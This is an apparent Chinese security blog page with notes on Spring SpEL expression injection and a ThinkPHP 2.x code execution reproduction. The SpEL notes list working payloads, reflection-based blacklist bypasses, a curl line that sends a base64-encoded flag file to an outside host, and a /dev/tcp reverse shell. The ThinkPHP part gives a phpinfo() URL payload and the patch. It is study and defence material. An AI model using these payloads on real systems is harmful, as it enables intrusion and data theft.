<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] numbers1 = (<span class="keyword">int</span>[]) parser.parseExpression(<span class="string">&quot;new int[4]&quot;</span>).getValue(context);</span><br></pre></td></tr></table></figure>

<h3 id="T操作符"><a href="#T操作符" class="headerlink" title="T操作符"></a>T操作符</h3><p><code>T()</code>运算符会调用类作用域的方法和常量。 </p>
<p> T操作符是一个特殊的操作符、可以同于指定java.lang.Class的实例（类型）。静态方法也可以通过这个操作符调用。  **T()引用java.lang包里面的类型不需要限定包全名，但是其他类型的引用必须要。 **</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Class dateClass = parser.parseExpression(<span class="string">&quot;T(java.util.Date)&quot;</span>).getValue(Class.class);</span><br><span class="line"></span><br><span class="line">Class stringClass = parser.parseExpression(<span class="string">&quot;T(String)&quot;</span>).getValue(Class.class);</span><br><span class="line"></span><br><span class="line"><span class="keyword">boolean</span> trueValue = parser.parseExpression(</span><br><span class="line">		<span class="string">&quot;T(java.math.RoundingMode).CEILING &gt;= T(java.math.RoundingMode).FLOOR&quot;</span>)</span><br><span class="line">		.getValue(Boolean.class);</span><br></pre></td></tr></table></figure>







<h3 id="表达式模板"><a href="#表达式模板" class="headerlink" title="表达式模板"></a>表达式模板</h3><p> 表达式模板运行在一段文本中混合包含一个或多个求值表达式模块。各个求值块都通过可被自定义的前后缀字符分隔，一个通用的选择是使用#{ }作为分隔符。 </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String randomPhrase = parser.parseExpression(</span><br><span class="line">		<span class="string">&quot;random number is #&#123;T(java.lang.Math).random()&#125;&quot;</span>,</span><br><span class="line">		<span class="keyword">new</span> TemplateParserContext()).getValue(String.class);</span><br></pre></td></tr></table></figure>

<p>结果：<code>random number is xxxx</code></p>
<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p> 表达式中的变量可以通过语法#变量名使用。变量可以在StandardEvaluationContext中通过方法setVariable设置。 </p>
<h4 id="this和root变量"><a href="#this和root变量" class="headerlink" title="this和root变量"></a>this和root变量</h4><p> #this变量永远指向当前表达式正在求值的对象（这时不需要限定全名）。变量#root总是指向根上下文对象。#this在表达式不同部分解析过程中可能会改变，但是#root总是指向根 </p>
<h3 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h3><p>T()和new一个类时 除了java.lang下的类，其他类都要需要需要限定包全名</p>
<h2 id="SpEL导致的任意命令执行"><a href="#SpEL导致的任意命令执行" class="headerlink" title="SpEL导致的任意命令执行"></a>SpEL导致的任意命令执行</h2><h3 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(&quot;nslookup a.com&quot;)</span><br><span class="line">T(Thread).sleep(10000)</span><br><span class="line">#this.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;nslookup a.com&#x27;)</span><br><span class="line">new java.lang.ProcessBuilder(&#123;&#x27;nslookup a.com&#x27;&#125;).start()</span><br></pre></td></tr></table></figure>



<p>利用反射构造绕过黑名单</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;curl fg5hme.ceye.io/`cat flag_j4v4_chun|base64|tr &#x27;\n&#x27; &#x27;-&#x27;`&quot;&#125;)&#125;</span><br></pre></td></tr></table></figure>



<p>利用ScriptEngineManager构造绕过黑名单</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(javax.script.ScriptEngineManager).newInstance()</span><br><span class="line">    .getEngineByName(<span class="string">&quot;nashorn&quot;</span>)</span><br><span class="line">        .eval(<span class="string">&quot;s=[3];s[0]=&#x27;/bin/bash&#x27;;s[1]=&#x27;-c&#x27;;s[2]=&#x27;ex&quot;</span>+<span class="string">&quot;ec 5&lt;&gt;/dev/tcp/1.2.3.4/2333;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&#x27;;java.la&quot;</span>+<span class="string">&quot;ng.Run&quot;</span>+<span class="string">&quot;time.getRu&quot;</span>+<span class="string">&quot;ntime().ex&quot;</span>+<span class="string">&quot;ec(s);&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;[&#x27;class&#x27;].forName(&#x27;java.lang.Runtime&#x27;).getDeclaredMethods()[15]</span><br><span class="line">    .invoke(&#x27;&#x27;[&#x27;class&#x27;].forName(&#x27;java.lang.Runtime&#x27;).getDeclaredMethods()[7]</span><br><span class="line">        .invoke(null),&#x27;curl 172.17.0.1:9898&#x27;)</span><br></pre></td></tr></table></figure>

<p> 除此以外当执行的系统命令被过滤或者被URL编码掉时我们可以通过<code>String</code>类动态生成字符<br>如要执行的命令为<code>open /Applications/Calculator.app</code>我们可以采用<code>new java.lang.String(new byte[]&#123;,,...&#125;)</code>或者<code>concat(T(java.lang.Character).toString())</code>嵌套来绕过 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(&quot;jdk.jshell.JShell&quot;,true).Methods[6].invoke(null,&#123;&#125;).eval(&#x27;whatever java code in one statement&#x27;).toString()</span><br></pre></td></tr></table></figure>



<h3 id="一些技巧"><a href="#一些技巧" class="headerlink" title="一些技巧"></a>一些技巧</h3><h4 id="new被过滤"><a href="#new被过滤" class="headerlink" title="new被过滤"></a>new被过滤</h4><p>可以用NEW</p>
<h3 id="一些相关的ctf题目"><a href="#一些相关的ctf题目" class="headerlink" title="一些相关的ctf题目"></a>一些相关的ctf题目</h3><h4 id="de1ctf2020-cal"><a href="#de1ctf2020-cal" class="headerlink" title="de1ctf2020 cal"></a>de1ctf2020 cal</h4><h3 id="SpEL提供的两个EvaluationContext的区别"><a href="#SpEL提供的两个EvaluationContext的区别" class="headerlink" title="SpEL提供的两个EvaluationContext的区别"></a>SpEL提供的两个<code>EvaluationContext</code>的区别</h3><p>SpEL提供的两个<code>EvaluationContext</code>的区别。<br>（EvaluationContext评估表达式以解析属性，方法或字段并帮助执行类型转换时使用该接口。有两个开箱即用的实现。）</p>
<ul>
<li>SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。</li>
<li>StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。</li>
</ul>
<p><code>SimpleEvaluationContext</code>旨在仅支持SpEL语言语法的一个子集。它不包括 Java类型引用，构造函数和bean引用。</p>
<p>所以说指定正确<code>EvaluationContext</code>，是防止SpEl表达式注入漏洞产生的首选，之前出现过相关的SpEL表达式注入漏洞，其修复方式就是使用<code>SimpleEvaluationContext</code>替代<code>StandardEvaluationContext</code>。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p> <a target="_blank" rel="noopener" href="http://rui0.cn/archives/1043">http://rui0.cn/archives/1043</a> </p>
<p> <a target="_blank" rel="noopener" href="http://ifeve.com/spring-6-spel/">http://ifeve.com/spring-6-spel/</a>  文档</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cku8j3fgk0025dan72nz78jio" data-title="SpEL表达式注入漏洞" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-ThinkPHP 2.x任意代码执行漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.672Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">ThinkPHP 2.x任意代码执行漏洞</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ThinkPHP-2-x任意代码执行漏洞"><a href="#ThinkPHP-2-x任意代码执行漏洞" class="headerlink" title="ThinkPHP 2.x任意代码执行漏洞"></a>ThinkPHP 2.x任意代码执行漏洞</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>thinkphp 2.1</p>
<p>官网的thinkphp 2.2已经修复了</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞位置</p>
<p><img src="https://i.loli.net/2020/01/30/8UW5mxvARaoFlPX.png" alt="image154"></p>
<p>路由解析处</p>
<p><code>$res = preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode($depr,$paths));</code></p>
<p>这个preg_replace有点古怪,没有用<code>/</code>来包围搜索模式而是用<code>@</code>,查找关于preg的文档发现</p>
<blockquote>
<p>当使用 PCRE 函数的时候，模式需要由<em>分隔符</em>闭合包裹。分隔符可以使任意非字母数字、非反斜线、非空白字符。   </p>
<p> 经常使用的分隔符是正斜线(<em>/</em>)、hash符号(<em>#</em>)   以及取反符号(<em>~</em>)。下面的例子都是使用合法分隔符的模式。    </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;/foo bar/</span><br><span class="line">&gt;#^[^0-9]$#</span><br><span class="line">&gt;+php+</span><br><span class="line">&gt;%[a-zA-Z0-9_-]%</span><br></pre></td></tr></table></figure>
</blockquote>
<p>替换常量,这个就变成了</p>
<p><code>preg_replace(&#39;@(\w+)/([^\/\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode(&#39;/&#39;,$paths));</code></p>
<p>查看preg_replace的介绍发现</p>
<blockquote>
<p>当使用被弃用的 e 修饰符时, 这个函数会转义一些字符(即：’、”、 \ 和 NULL) 然后进行后向引用替换。当这些完成后请确保后向引用解析完后没有单引号或双引号引起的语法错误(比如： ‘strlen(&#39;$1&#39;)+strlen(“$2”)’)。确保符合PHP的 字符串语法，并且符合eval语法。因为在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串。 </p>
</blockquote>
<p>执行<code>$replacement</code>(第二个参数)前,会先替换掉引用</p>
<p>我们可以看到,<code>$replacement</code>用双引号来包围引用<code>\\2</code>,会导致命令执行</p>
<p>构造</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$paths</span>=<span class="keyword">array</span>(</span><br><span class="line">	<span class="string">&#x27;xxxx&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;$&#123;phpinfo()&#125;&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>则<code>&#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;</code>变为<code>$var[&#39;xxxx&#39;]=&quot;$&#123;phpinfo()&#125;&quot;;</code></p>
<p>从而导致命令执行</p>
<p>于是构造payload</p>
<p><code>[http://127.0.0.1/public/index.php?s=/index/index/name/$%7B@phpinfo()%7D](http://127.0.0.1/public/index.php?s=/index/index/name/$&#123;@phpinfo()&#125;)</code></p>
<h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p><img src="https://i.loli.net/2020/01/30/9AlHbyKzaBOJXnR.png" alt="image1293"></p>
<p>用单引号来包围所有引用就可以避免命令执行</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/thinkphp/2-rce">https://github.com/vulhub/vulhub/tree/master/thinkphp/2-rce</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cku8j3fgm002adan7fytt9ouf" data-title="ThinkPHP 2.x任意代码执行漏洞" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/5/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/7/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 11.67px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 15px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/htb/" style="font-size: 10px;">htb</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 11.67px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16.67px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 10px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/10/01/%E5%9C%A8%E7%BA%BFoj%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/">在线oj获取数据</a>
          </li>
        
          <li>
            <a href="/2021/10/01/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a>
          </li>
        
          <li>
            <a href="/2021/10/01/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/">巅峰极客</a>
          </li>
        
          <li>
            <a href="/2021/10/01/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020wp/">巅峰极客2020wp</a>
          </li>
        
          <li>
            <a href="/2021/10/01/%E6%88%91%E7%9A%842020/">我的2020</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>